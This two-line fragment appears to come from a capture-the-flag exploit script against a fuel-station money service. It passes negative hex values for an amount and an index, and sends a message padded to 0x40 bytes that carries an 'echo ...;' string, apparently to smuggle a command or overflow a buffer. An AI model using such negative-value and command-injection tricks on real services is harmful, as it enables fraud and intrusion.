...
add_money(uid, amount=-0x38aeb0, oil_id=-0x38, station_id=16018)
send(uid, balance=1, fr=16007, to=16018, msg='echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; '.ljust(0x40, ' '))
